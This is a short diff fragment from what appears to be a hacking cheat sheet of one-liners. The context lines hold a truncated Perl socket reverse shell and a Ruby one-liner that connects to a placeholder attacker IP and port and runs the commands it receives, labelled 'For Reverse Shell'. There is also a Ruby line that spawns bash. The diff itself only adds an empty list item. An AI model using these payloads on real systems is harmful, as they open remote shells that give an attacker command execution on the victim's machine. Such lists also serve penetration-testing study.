@@ -124,3 +124,4 @@ perl -e 'use Socket;$i="<attacker_ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,ge
 ruby -e 'exec "/bin/bash"'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<attacker_ip>",<port>);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' - **For Reverse Shell**
 ```
+- 
